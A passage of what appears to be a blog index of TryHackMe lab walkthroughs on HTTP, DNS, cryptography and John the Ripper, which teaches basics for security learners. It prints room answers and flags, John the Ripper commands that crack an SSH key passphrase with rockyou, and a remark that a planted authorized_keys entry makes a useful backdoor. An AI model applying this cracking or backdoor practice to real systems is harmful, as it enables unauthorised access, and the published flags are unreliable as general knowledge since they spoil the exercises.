internet. The below image shows what a URL looks like with all of its features (it does not use all features in every request).\n\nA diagram showing different parts of a URL on an example, where http is the scheme, user:password is the user, tryhackme.com is a domain or the host, 80 is the port, view-room is the path, ?id&#x3D;1 is the query string, and #task3 is the fragment. The full address is http://user:password@tryhackme.com:80/view-room?id=1#task3.\nScheme: This instructs on what protocol to use for accessing the resource such as HTTP, HTTPS, FTP (File Transfer Protocol).\nUser: Some services require authentication to log in, you can put a username and password into the URL to log in.\nHost: The domain name or IP address of the server you wish to access.\nPort: The Port that you are going to connect to, usually 80 for HTTP and 443 for HTTPS, but this can be hosted on any port between 1 - 65535.\nPath: The file name or location of the resource you are trying to access.\nQuery String: Extra bits of information that can be sent to the requested path. For example, &#x2F;blog?id&#x3D;1 would tell the blog path that you wish to receive the blog article with the id of 1.\nFragment: This is a reference to a location on the actual page requested. This is commonly used for pages with long content and can have a certain part of the page directly linked to it, so it is viewable to the user as soon as they access the page.\nMaking a Request\nIt’s possible to make a request to a web server with just one line “GET &#x2F; HTTP&#x2F;1.1”\n\nBut for a much richer web experience, you’ll need to send other data as well. This other data is sent in what is called headers, where headers contain extra information to give to the web server you’re communicating with, but we’ll go more into this in the Header task.\nExample Request:\n1234GET / HTTP/1.1Host: tryhackme.comUser-Agent: Mozilla/5.0 Firefox/87.0Referer: https://tryhackme.com/\nTo breakdown each line of this request:\nLine 1: This request is sending the GET method ( more on this in the HTTP Methods task ), request the home page with &#x2F; and telling the web server we are using HTTP protocol version 1.1.\nLine 2: We tell the web server we want the website tryhackme.com\nLine 3: We tell the web server we are using the Firefox version 87 Browser\nLine 4: We are telling the web server that the web page that referred us to this one is https://tryhackme.com\nLine 5: HTTP requests always end with a blank line to inform the web server that the request has finished.\nExample Response:\n1234567891011121314HTTP/1.1 200 OKServer: nginx/1.15.8Date: Fri, 09 Apr 2021 13:34:03 GMTContent-Type: text/htmlContent-Length: 98&lt;html&gt;&lt;head&gt;    &lt;title&gt;TryHackMe&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    Welcome To TryHackMe.com&lt;/body&gt;&lt;/html&gt;\nTo breakdown each line of the response:\nLine 1: HTTP 1.1 is the version of the HTTP protocol the server is using and then followed by the HTTP Status Code in this case “200 Ok” which tells us the request has completed successfully.\nLine 2: This tells us the web server software and version number.\nLine 3: The current date, time and timezone of the web server.\nLine 4: The Content-Type header tells the client what sort of information is going to be sent, such as HTML, images, videos, pdf, XML.\nLine 5: Content-Length tells the client how long the response is, this way we can confirm no data is missing.\nLine 6: HTTP response contains a blank line to confirm the end of the HTTP response.\nLines 7-14: The information that has been requested, in this instance the homepage.\nQuestions and Answers in the task1. What HTTP protocol is being used in the above example?Answer:\n\nHTTP/1.12. What response header tells the browser how much data to expect?Answer:\ncontent-length\n\nHTTP MethodsHTTP methods are a way for the client to show their intended action when making an HTTP request. There are a lot of HTTP methods but we’ll cover the most common ones, although mostly you’ll deal with the GET and POST method.\nGET Request\nThis is used for getting information from a web server.\nPOST Request\nThis is used for submitting data to the web server and potentially creating new records\nPUT Request\nThis is used for submitting data to a web server to update information\nDELETE Request\nThis is used for deleting information&#x2F;records from a web server.\nQuestions and Answers in the Task\nWhat method would be used to create a new user account?\n\n\nAnswer: POST\n\n\nWhat method would be used to update your email address?\n\n\nAnswer: PUT\n\n\nWhat method would be used to remove a picture you’ve uploaded to your account?\n\n\nAnswer: DELETE\n\n\nWhat method would be used to view a news article?\n\n\nAnswer: GET\n\nHTTP Status CodesHTTP Status Codes:In the previous task, you learnt that when a HTTP server responds, the first line always contains a status code informing the client of the outcome of their request and also potentially how to handle it. These status codes can be broken down into 5 different ranges:\n\n\n\nStatus Code Range\nDescription\n\n\n\n100-199\nInformation Response - These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.\n\n\n200-299\nSuccess - This range of status codes is used to tell the client their request was successful.\n\n\n300-399\nRedirection - These are used to redirect the client’s request to another resource. This can be either to a different webpage or a different website altogether.\n\n\n400-499\nClient Errors - Used to inform the client that there was an error with their request.\n\n\n500-599\nServer Errors - This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.\n\n\nCommon HTTP Status Codes\n\n\nStatus Code\nDescription\n\n\n\n200 - OK\nThe request was completed successfully.\n\n\n201 - Created\nA resource has been created (for example a new user or new blog post).\n\n\n301 - Moved Permanently\nThis redirects the client’s browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead.\n\n\n302 - Found\nSimilar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future.\n\n\n400 - Bad Request\nThis tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn’t send.\n\n\n401 - Not Authorised\nYou are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password.\n\n\n403 - Forbidden\nYou do not have permission to view this resource whether you are logged in or not.\n\n\n404 - Page Not Found\nThe page&#x2F;resource you requested does not exist.\n\n\n405 - Method Not Allowed\nThe resource does not allow this method request, for example, you send a GET request to the resource &#x2F;create-account when it was expecting a POST request instead.\n\n\n500 - Internal Service Error\nThe server has encountered some kind of error with your request that it doesn’t know how to handle properly.\n\n\n503 - Service Unavailable\nThis server cannot handle your request as it’s either overloaded or down for maintenance.\n\n\nQuestions and Answers in the Task1. What response code might you receive if you’ve created a new user or blog post article?\n\nAnswer: 201\n\n2. What response code might you receive if you’ve tried to access a page that doesn’t exist?\n\nAnswer: 404\n\n3. What response code might you receive if the web server cannot access its database and the application crashes?\n\nAnswer: 503\n\n4. What response code might you receive if you try to edit your profile without logging in first?\n\nAnswer: 401\n\nTASK 5 - HeadersHeaders are additional bits of data you can send to the web server when making requests.\nAlthough no headers are strictly required when making a HTTP request, you’ll find it difficult to view a website properly.\nCommon Request HeadersThese are headers that are sent from the client (usually your browser) to the server.\nHost: Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you’ll just receive the default website for the server.\nUser-Agent: This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HTML, JavaScript and CSS are only available in certain browsers.\nContent-Length: When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn’t missing any data.\nAccept-Encoding: Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet.\nCookie: Data sent to the server to help remember your information (see cookies task for more information).Common Response Headers\nThese are the headers that are returned to the client from the server after a request.\nSet-Cookie: Information to store which gets sent back to the web server on each request (see cookies task for more information).\nCache-Control: How long to store the content of the response in the browser’s cache before it requests it again.\nContent-Type: This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data.\nContent-Encoding: What method has been used to compress the data to make it smaller when sending it over the internet.\nAnswer the questions below\nWhat header tells the web server what browser is being used?\n\n\nAnswer: user-agent\n\n\nWhat header tells the browser what type of data is being returned?\n\n\nAnswer: content-type\n\n\nWhat header tells the web server which website is being requested?\n\n\nAnswer: host\n\nTASK 6 - CookiesYou’ve probably heard of cookies before, they’re just a small piece of data that is stored on your computer. Cookies are saved when you receive a “Set-Cookie” header from a web server. Then every further request you make, you’ll send the cookie data back to the web server. Because HTTP is stateless (doesn’t keep track of your previous requests), cookies can be used to remind the web server who you are, some personal settings for the website or whether you’ve been to the website before. Let’s take a look at this as an example HTTP request:A diagram visualizing how cookies are introduced in http requests to allow storing user information\nCookies can be used for many purposes but are most commonly used for website authentication. The cookie value won’t usually be a clear-text string where you can see the password, but a token (unique secret code that isn’t easily humanly guessable).\nViewing Your Cookies\nYou can easily view what cookies your browser is sending to a website by using the developer tools, in your browser.\nQuestions and Answers in the Task ?1. which header is used to save cookies in your computer\n\nAnswer: set-cookie\n\nMaking Requests\nClick the “View Site” button on the right.\nThis is an emulator for making demo HTTP requests, using what you’ve learnt from the above tasks you can use it to complete the below questions.\nQuestions and answers in the task1. Make a GET request to &#x2F;room\n\n\nAnswer: THM&#123;YOU&#39;RE_IN_THE_ROOM&#125;\n\n2. Make a GET request to &#x2F;blog and using the gear icon set the id parameter to 1 in the URL field\n\n\nAnswer: THM&#123;YOU_FOUND_THE_BLOG&#125;\n\n3. Make a DELETE request to &#x2F;user&#x2F;1\n\n\nAnswer: THM&#123;USER_IS_DELETED&#125;\n\n4. Make a PUT request to &#x2F;user&#x2F;2 with the username parameter set to admin\n\n\nAnswer: THM&#123;USER_HAS_UPDATED&#125;\n\n5. POST the username of thm and a password of letmein to &#x2F;login\n\n\nAnswer: THM&#123;HTTP_REQUEST_MASTER&#125;\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/HTTP-in-detail-THM","date":"2024-05-22T18:09:01.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"b79812bf9f9c79ac4e4543b225fa1821","title":"DNS in Detail - THM","content":"DNS in DetailTASK - 1  What is DNS?What is DNS?DNS (Domain Name System) provides a simple way for us to communicate with devices on the internet without remembering complex numbers. Much like every house has a unique address for sending mail directly to it, every computer on the internet has its own unique address to communicate with it called an IP address. An IP address looks like the following 104.26.10.229, 4 sets of digits ranging from 0 - 255 separated by a period. When you want to visit a website, it’s not exactly convenient to remember this complicated set of numbers, and that’s where DNS can help. So instead of remembering 104.26.10.229, you can remember tryhackme.com instead.\n\nQuestions and Answers in the Task\nWhat Does DNS Stands For ?Answer: Domain Name System\n\nTASK -2 Domain HierarchyDomain Hierarchy\nTLD (Top-Level Domain)A TLD is the most righthand part of a domain name. So, for example, the tryhackme.com TLD is .com. There are two types of TLD, gTLD (Generic Top Level) and ccTLD (Country Code Top Level Domain). Historically a gTLD was meant to tell the user the domain name’s purpose; for example, a .com would be for commercial purposes, .org for an organisation, .edu for education and .gov for government. And a ccTLD was used for geographical purposes, for example, .ca for sites based in Canada, .co.uk for sites based in the United Kingdom and so on. Due to such demand, there is an influx of new gTLDs ranging from .online , .club , .website , .biz and so many more. For a full list of over 2000 TLDs click here.\nSecond Level DomainTaking tryhackme.com as an example, the .com part is the TLD, and tryhackme is the Second Level Domain. When registering a domain name, the second-level domain is limited to 63 characters + the TLD and can only use a-z 0-9 and hyphens (cannot start or end with hyphens or have consecutive hyphens).\nSub DomainA subdomain sits on the left-hand side of the Second-Level Domain using a period to separate it; for example, in the name admin.tryhackme.com the admin part is the subdomain. A subdomain name has the same creation restrictions as a Second-Level Domain, being limited to 63 characters and can only use a-z 0-9 and hyphens (cannot start or end with hyphens or have consecutive hyphens). You can use multiple subdomains split with periods to create longer names, such as jupiter.servers.tryhackme.com. But the length must be kept to 253 characters or less. There is no limit to the number of subdomains you can create for your domain name.\nQuestions and Answers in the task\nWhat is the maximum length of a subdomain?ANSWER: 63\nWhich of the following characters cannot be used in a subdomain ( 3 b _ - )?ANSWER: _\nWhat is the maximum length of a domain name?ANSWER: 253\nWhat type of TLD is .co.uk?ANSWER: ccTLD\n\nTASK 3 - Record TypesDNS RECORD TYPESA RecordThese records resolve to IPv4 addresses, for example 104.26.10.229AAAA RecordThese records resolve to IPv6 addresses, for example 2606:4700:20::681a:be5CNAME recordThese records resolve to another domain name, for example, TryHackMe’s online shop has the subdomain name store.tryhackme.com which returns a CNAME record shops.shopify.com. Another DNS request would then be made to shops.shopify.com to work out the IP address.MX RecordThese records resolve to the address of the servers that handle the email for the domain you are querying, for example an MX record response for tryhackme.com would look something like alt1.aspmx.l.google.com. These records also come with a priority flag. This tells the client in which order to try the servers, this is perfect for if the main server goes down and email needs to be sent to a backup server.TXT RecordTXT records are free text fields where any text-based data can be stored. TXT records have multiple uses, but some common ones can be to list servers that have the authority to send an email on behalf of the domain (this can help in the battle against spam and spoofed email). They can also be used to verify ownership of the domain name when signing up for third party services.\nQuestions and Answers in the Task\nWhat type of record would be used to advise where to send email?Answer: MX\nWhat type of record handles IPv6 addresses?Answer: AAAA\n\nTASK 4 - Making a RequestWhat Happens When You Make a Request\nWhen you request a domain name, your computer first checks its local cache to see if you’ve previously looked up the address recently; if not, a request to your Recursive DNS Server will be made.\nA Recursive DNS Server is usually provided by your ISP, but you can also choose your own. This server also has a local cache of recently looked up domain names. If a result is found locally, this is sent back to your computer, and your request ends here (this is common for popular and heavily requested services such as Google, Facebook, Twitter). If the request cannot be found locally, a journey begins to find the correct answer, starting with the internet’s root DNS servers.\nThe root servers act as the DNS backbone of the internet; their job is to redirect you to the correct Top Level Domain Server, depending on your request. If, for example, you request www.tryhackme.com, the root server will recognise the Top Level Domain of .com and refer you to the correct TLD server that deals with .com addresses.\nThe TLD server holds records for where to find the authoritative server to answer the DNS request. The authoritative server is often also known as the nameserver for the domain. For example, the name server for tryhackme.com is kip.ns.cloudflare.com and uma.ns.cloudflare.com. You’ll often find multiple nameservers for a domain name to act as a backup in case one goes down.\nAn authoritative DNS server is the server that is responsible for storing the DNS records for a particular domain name and where any updates to your domain name DNS records would be made. Depending on the record type, the DNS record is then sent back to the Recursive DNS Server, where a local copy will be cached for future requests and then relayed back to the original client that made the request. DNS records all come with a TTL (Time To Live) value. This value is a number represented in seconds that the response should be saved for locally until you have to look it up again. Caching saves on having to make a DNS request every time you communicate with a server.\n\nQuestions and Answers in the Task\nWhat field specifies how long a DNS record should be cached for?ANSWER: TTL\nWhat type of DNS Server is usually provided by your ISP?ANSWER: Recursive\nWhat type of server holds all the records for a domain?ANSWER: authoritative\n\nPRACTICALUsing the website on the right, we can build requests to make DNS queries and view the results. The website will also show you the command you’d need to run on your own computer if you wished to make the requests yourself.click on View site\n\nWhat is the CNAME of shop.website.thm?ANSWER:\n\n\n\nAnswer: &#96;shops.myshopify.com\n\n\nWhat is the value of the TXT record of website.thm?ANSWER:\n\n\n\nAnswer: THM&#123;7012BBA60997F35A9516C2E16D2944FF&#125;\n\n\nWhat is the numerical priority value for the MX record?ANSWER:\n\n\n\nAnswer:30\n\n\nWhat is the IP address for the A record of www.website.thm?ANSWER:\n\n\n\nAnswer: 10.10.10.10\n\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/DNS-in-Detail","date":"2024-05-22T17:28:57.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"47e2aeaa7cfad81b420e64c0e671a73f","title":"Encryption - Crypto 101 - THM Walkthrough","content":"Hello Hackers 🚀Today we are gonna walkthrough a new room on Try Hack Me called “Encryption - Crypto 101“\nTASK 1 - What will this room cover?This room will cover:\n\nWhy cryptography matters for security and CTFs\nThe two main classes of cryptography and their uses\nRSA, and some of the uses of RSA\n2 methods of Key Exchange\nNotes about the future of encryption with the rise of Quantum ComputingNote: This room expects some familiarity with tools, and some research into how to use them yourself!\n\nTASK 2 - Key TermsMany of these key terms are shared with https://tryhackme.com/room/hashingcrypto101, so you might be able to skip over some if you’re already familiar.\n\nCiphertext - The result of encrypting a plaintext, encrypted data\nCipher - A method of encrypting or decrypting data. Modern ciphers are cryptographic, but there are many non cryptographic ciphers like Caesar.\nPlaintext - Data before encryption, often text but not always. Could be a photograph or other file\nEncryption - Transforming data into ciphertext, using a cipher.\nEncoding - NOT a form of encryption, just a form of data representation like base64. Immediately reversible.\nKey - Some information that is needed to correctly decrypt the ciphertext and obtain the plaintext.\nPassphrase - Separate to the key, a passphrase is similar to a password and used to protect a key.\nAsymmetric encryption - Uses different keys to encrypt and decrypt.\nSymmetric encryption - Uses the same key to encrypt and decrypt\nBrute force - Attacking cryptography by trying every different password or every different key\nCryptanalysis - Attacking cryptography by finding a weakness in the underlying maths\n\nAlice and Bob - Used to represent 2 people who generally want to communicate. They’re named Alice and Bob because this gives them the initials A and B. https://en.wikipedia.org/wiki/Alice_and_Bob for more information, as these extend through the alphabet to represent many different people involved in communication.\nWARNING: This room is very theory heavy. Cryptography is a big topic, and this room is designed to just scratch the surface.\nQuestions and Answers in the Task\nAre SSH keys protected with a passphrase or a password?Answer: Passphrase\n\nTASK 3 - Why Encryption is important ?Cryptography is used to protect confidentiality, ensure integrity, ensure authenticity. You use cryptography every day most likely, and you’re almost certainly reading this now over an encrypted connection.When logging into TryHackMe, your credentials were sent to the server. These were encrypted, otherwise someone would be able to capture them by snooping on your connection.When you connect to SSH, your client and the server establish an encrypted tunnel so that no one can snoop on your session.When you connect to your bank, there’s a certificate that uses cryptography to prove that it is actually your bank rather than a hacker.When you download a file, how do you check if it downloaded right? You can use cryptography here to verify a checksum of the data.You rarely have to interact directly with cryptography, but it silently protects almost everything you do digitally.\nWhenever sensitive user data needs to be stored, it should be encrypted. Standards like PCI-DSS state that the data should be encrypted both at rest (in storage) AND while being transmitted. If you’re handling payment card details, you need to comply with these PCI regulations. Medical data has similar standards. With legislation like GDPR and California’s data protection, data breaches are extremely costly and dangerous to you as either a consumer or a business.\nDO NOT encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plaintext, and you should use hashing to manage them safely.\nQuestions and Answers in the task\nWhat Does SSH Stands For ?Answer: Secure Shell\nHow to Webservers prove their Identity?Answer: Certificates\nWhat is the main set of standards you need to comply with if you store or process payment card details?Answer: PCI-DSS\n\nTASK 4 - crucial Crypto MathsThere’s a little bit of math(s) that comes up relatively often in cryptography. The Modulo operator. Pretty much every programming language implements this operator, or has it available through a library. When you need to work with large numbers, use a programming language. Python is good for this as integers are unlimited in size, and you can easily get an interpreter.\nWhen learning division for the first time, you were probably taught to use remainders in your answer. X % Y is the remainder when X is divided by Y.\nExamples\n\n25 % 5 &#x3D; 0 (5*5 &#x3D; 25 so it divides exactly with no remainder)\n23 % 6 &#x3D; 5 (23 does not divide evenly by 6, there would be a remainder of 5)An important thing to remember about modulo is that it’s not reversible. If I gave you an equation: x % 5 &#x3D; 4, there are infinite values of x that will be valid.\n\nQuestions and Answers in the Task\nWhat’s 30 % 5?Answer : 0 \nWhat’s 25 % 7?Answer: 4\nWhat’s 118613842 % 9091?Answer: 3565\n\nTASK 5 - Types of EncryptionThe two main categories of Encryption are symmetric and symmetric.\nSymmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long).\nAsymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.\nRSA and Elliptic Curve cryptography are based around different mathematically difficult (intractable) problems, which give them their strength. More about RSA later.\nQuestions and Answers in the task\nShould you trust DES? Yea&#x2F;NayAnswer: Nay\nWhat was the result of the attempt to make DES more secure so that it could be used for longer?Answer: Triple DES\nIs it ok to share your public key? Yea&#x2F;NayAnswer: Yea\n\nTask 6 - RSA - Rivest Shamir AdlemanThe math(s) sideRSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17*23 &#x3D; 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).\nThe attacking sideThe maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.\nThere are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is https://github.com/Ganapati/RsaCtfTool which has worked very well for me. I’ve also had some success with https://github.com/ius/rsatool.\nThe key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.\n“p” and “q” are large prime numbers, “n” is the product of p and q.\n\nThe public key is n and e, the private key is n and d.\n\n“m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).\n\n\nCTFs involving RSACrypto CTF challenges often present you with a set of these values, and you need to break the encryption and decrypt a message to retrieve the flag.\nThere’s a lot more maths to RSA, and it gets quite complicated fairly quickly. If you want to learn the maths behind it, I recommend reading MuirlandOracle’s blog post here: https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/.\nQuestions and Answers of the Task\np &#x3D; 4391, q &#x3D; 6659. What is n?Answer:Let’s Recall what is p , q &amp; np &amp; q are prime numbers and n is product of p&amp;qso n = p*qn = 4391*6659n = 29239669\n\nTASK 7 - Establishing Keys Using Asymmetric CryptographyA very common use of asymmetric cryptography is exchanging keys for symmetric encryption.Asymmetric encryption tends to be slower, so for things like HTTPS symmetric encryption is better.But the question is, how do you agree a key with the server without transmitting the key for people snooping to see?\nMetaphor timeImagine you have a secret code, and instructions for how to use the secret code. If you want to send your friend the instructions without anyone else being able to read it, what you could do is ask your friend for a lock.\nOnly they have the key for this lock, and we’ll assume you have an indestructible box that you can lock with it.If you send the instructions in a locked box to your friend, they can unlock it once it reaches them and read the instructions.After that, you can communicate in the secret code without risk of people snooping.In this metaphor, the secret code represents a symmetric encryption key, the lock represents the server’s public key, and the key represents the server’s private key.You’ve only used asymmetric cryptography once, so it’s fast, and you can now communicate privately with symmetric encryption.\nThe Real WorldIn reality, you need a little more cryptography to verify the person you’re talking to is who they say they are, which is done using digital signatures and certificates. You can find a lot more detail on how HTTPS (one example where you need to exchange keys) really works from this excellent blog post. https://robertheaton.com/2014/03/27/how-does-https-actually-work/\nTASK 8 - Digital Signatures and CertificatesWhat’s a Digital Signature?Digital signatures are a way to prove the authenticity of files, to prove who created or modified them. Using asymmetric cryptography, you produce a signature with your private key and it can be verified using your public key. As only you should have access to your private key, this proves you signed the file. Digital signatures and physical signatures have the same value in the UK, legally.\nThe simplest form of digital signature would be encrypting the document with your private key, and then if someone wanted to verify this signature they would decrypt it with your public key and check if the files match.\nCertificates - Prove who you are!Certificates are also a key use of public key cryptography, linked to digital signatures. A common place where they’re used is for HTTPS. How does your web browser know that the server you’re talking to is the real tryhackme.com?\nThe answer is certificates. The web server has a certificate that says it is the real tryhackme.com. The certificates have a chain of trust, starting with a root CA (certificate authority). Root CAs are automatically trusted by your device, OS, or browser from install. Certs below that are trusted because the Root CAs say they trust that organisation. Certificates below that are trusted because the organisation is trusted by the Root CA and so on. There are long chains of trust. Again, this blog post explains this much better than I can. https://robertheaton.com/2014/03/27/how-does-https-actually-work/\nYou can get your own HTTPS certificates for domains you own using Let’s Encrypt for free. If you run a website, it’s worth setting it up.\nQuestions and Answers of the Taks\nWho is TryHackMe’s HTTPS certificate issued by?Answer:you can check that using site setting which are generally showed in the address bar of your browserclikc on view certificate or lock icon to view the details of the siteso answer is E1\n\nTASK 9 - SSH AuthenticationEncryption and SSH authenticationBy default, SSH is authenticated using usernames and passwords in the same way that you would log in to the physical machine.\nAt some point, you’re almost certain to hit a machine that has SSH configured with key authentication instead. This uses public and private keys to prove that the client is a valid and authorised user on the server. By default, SSH keys are RSA keys. You can choose which algorithm to generate, and&#x2F;or add a passphrase to encrypt the SSH key. ssh-keygen is the program used to generate pairs of keys most of the time.\nSSH Private KeysYou should treat your private SSH keys like passwords. Don’t share them, they’re called private keys for a reason. If someone has your private key, they can use it to log in to servers that will accept it unless the key is encrypted.\nIt’s very important to mention that the passphrase to decrypt the key isn’t used to identify you to the server at all, all it does is decrypt the SSH key. The passphrase is never transmitted, and never leaves your system.\nUsing tools like John the Ripper, you can attack an encrypted SSH key to attempt to find the passphrase, which highlights the importance of using a secure passphrase and keeping your private key private.\nWhen generating an SSH key to log in to a remote machine, you should generate the keys on your machine and then copy the public key over as this means the private key never exists on the target machine. For temporary keys generated for access to CTF boxes, this doesn’t matter as much.\nHow do I use these keys?The ~/.ssh folder is the default place to store these keys for OpenSSH. The authorized_keys (note the US English spelling) file in this directory holds public keys that are allowed to access the server if key authentication is enabled. By default on many distros, key authentication is enabled as it is more secure than using a password to authenticate. Normally for the root user, only key authentication is enabled.\nIn order to use a private SSH key, the permissions must be set up correctly otherwise your SSH client will ignore the file with a warning. Only the owner should be able to read or write to the private key (600 or stricter). ssh -i keyNameGoesHere user@host is how you specify a key for the standard Linux OpenSSH client.\nUsing SSH keys to get a better shellSSH keys are an excellent way to “upgrade” a reverse shell, assuming the user has login enabled (www-data normally does not, but regular users and root will). Leaving an SSH key in authorized_keys on a box can be a useful backdoor, and you don’t need to deal with any of the issues of unstabilised reverse shells like Control-C or lack of tab completion.Download the task files from here\nQuestions and answers in the task\nWhat algorithm does the key use?Answer:By looking at the file name we can say it uses rsa algorithm\nCrack the password with John The Ripper and rockyou, what’s the passphrase for the key?Answer:\n\n\nwe can crack the password &#x2F; passphrase of the key using John\nFirst we need extract the hash of the file by using:ssh2john id_rsa_1593558668558.id_rsa &gt; ssh_key.txt\nThen we need to crack the hash to find passphrase by usingjohn --wordlist=/usr/share/wordlists/rockyou.txt ssh_key.txt output:  So passphrase for the key is delicious\n\nTASK 10 - Explaining Diffie Hellman Key Exchange**What is Key Exchange?Key exchange allows 2 people&#x2F;parties to establish a set of common cryptographic keys without an observer being able to get these keys. Generally, to establish common symmetric keys.\nHow does Diffie Hellman Key Exchange work?Alice and Bob want to talk securely. They want to establish a common key, so they can use symmetric cryptography, but they don’t want to use key exchange with asymmetric cryptography. This is where DH Key Exchange comes in.\nAlice and Bob both have secrets that they generate, let’s call these A and B. They also have some common material that’s public, let’s call this C.\nWe need to make some assumptions. Firstly, whenever we combine secrets&#x2F;material it’s impossible or very very difficult to separate. Secondly, the order that they’re combined in doesn’t matter.\nAlice and Bob will combine their secrets with the common material, and form AC and BC. They will then send these to each other, and combine that with their secrets to form two identical keys, both ABC. Now they can use this key to communicate.\nExtra ResourcesAn excellent video if you want a visual explanation is available here. https://www.youtube.com/watch?v=NmM9HA2MQGI\nDH Key Exchange is often used alongside RSA public key cryptography, to prove the identity of the person you’re talking to with digital signing. This prevents someone from attacking the connection with a man-in-the-middle attack by pretending to be Bob.\nTASK 11 - PGP, GPG and AESWhat is PGP?PGP stands for Pretty Good Privacy. It’s a software that implements encryption for encrypting files, performing digital signing and more.\nWhat is GPG?GnuPG or GPG is an Open Source implementation of PGP from the GNU project. You may need to use GPG to decrypt files in CTFs. With PGP&#x2F;GPG, private keys can be protected with passphrases in a similar way to SSH private keys. If the key is passphrase protected, you can attempt to crack this passphrase using John The Ripper and gpg2john. The key provided in this task is not protected with a passphrase.The man page for GPG can be found online here.\nWhat about AES?AES, sometimes called Rijndael after its creators, stands for Advanced Encryption Standard. It was a replacement for DES which had short keys and other cryptographic flaws.\nAES and DES both operate on blocks of data (a block is a fixed size series of bits).\nAES is complicated to explain, and doesn’t seem to come up as often. If you’d like to learn how it works, here’s an excellent video from Computerphile https://www.youtube.com/watch?v=O4xNJsjtN6E\nDownload the Task Files From Here\nQuestions and Answers of the Task\nYou have the private key, and a file encrypted with the public key. Decrypt the file. What’s the secret word?Answer:\n\n\nwe can decrypt the message by using gpg utility in linux\nfirst we need to import the key usinggpg --import tryhackme.key\nNow we can directly decrypt the message by usinggpg message.gpg\nLet’s see the content of the message using catcat messageOUTPUT:so secret word is pineapple\n\nTask 12 The Future - Quantum Computers and EncryptionQuantum computers will soon be a problem for many types of encryption.\nAsymmetric and QuantumWhile it’s unlikely we’ll have sufficiently powerful quantum computers until around 2030, once these exist encryption that uses RSA or Elliptical Curve Cryptography will be very fast to break. This is because quantum computers can very efficiently solve the mathematical problems that these algorithms rely on for their strength.\nAES&#x2F;DES and QuantumAES with 128 bit keys is also likely to be broken by quantum computers in the near future, but 256 bit AES can’t be broken as easily. Triple DES is also vulnerable to attacks from quantum computers.\nCurrent RecommendationsThe NSA recommends using RSA-3072 or better for asymmetric encryption and AES-256 or better for symmetric encryption. There are several competitions currently running for quantum safe cryptographic algorithms, and it’s likely that we will have a new encryption standard before quantum computers become a threat to RSA and AES.\nLearn More about Quantum Computers and CryptographyIf you’d like to learn more about this, NIST has resources that detail what the issues with current encryption is and the currently proposed solutions for these. https://doi.org/10.6028/NIST.IR.8105\nI also recommend the book &quot;Cryptography Apocalypse&quot; By Roger A. Grimes, as this was my introduction to quantum computing and quantum safe cryptography.\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/HASHING & CRACKING/Encryption-101","date":"2024-05-21T10:34:20.000Z","categories_index":"cybersecurity,THM,cryptography","tags_index":"tryhackme,cryptography,hashing","author_index":"Satvik"},{"id":"5f7b8ef4b9940ed8e2c482b3c33809b3","title":"John The Ripper - THM Walkthrough","content":"Hello Hackers 🚀Today we will be solving the challenges in John The Ripper room on TryHacKMe \nTASK 1 - John WhoWelcomeJohn the Ripper is one of the most well known, well-loved and versatile hash cracking tools out there. It combines a fast cracking speed, with an extraordinary range of compatible hash types. This room will assume no previous knowledge, so we must first cover some basic terms and concepts before we move into practical hash cracking.\nWhat are Hashes?A hash is a way of taking a piece of data of any length and  representing it in another form that is a fixed length. This masks the original value of the data. This is done by running the original data through a hashing algorithm. There are many popular hashing algorithms, such as MD4,MD5, SHA1 and NTLM. Lets try and show this with an example:\nIf we take “polo”, a string of 4 characters- and run it through an MD5 hashing algorithm, we end up with an output of: b53759f3ce692de7aff1b5779d3964da a standard 32 character MD5 hash.\nLikewise, if we take “polomints”, a string of 9 characters- and run it through the same MD5 hashing algorithm, we end up with an output of: 584b6e4f4586e136bc280f27f9c64f3b another standard 32 character MD5 hash.\nWhat makes Hashes secure?Hashing functions are designed as one-way functions. In other words, it is easy to calculate the hash value of a given input; however, it is a difficult problem to find the original input given the hash value. By “difficult”, we mean that it is computationally infeasible. This has its roots in mathematics and P vs NP.\nIn computer science, P and NP are two classes of problems that help us understand the efficiency of algorithms:\nP (Polynomial Time): Class P covers the problems whose solution can be found in polynomial time. Consider sorting a list in increasing order. The longer the list, the longer it would take to sort; nonetheless, the increase in time is not exponential.NP (Non-deterministic Polynomial Time): Problems in the class NP are those for which a given solution can be checked quickly, even though finding the solution itself might be hard. In fact, we don’t 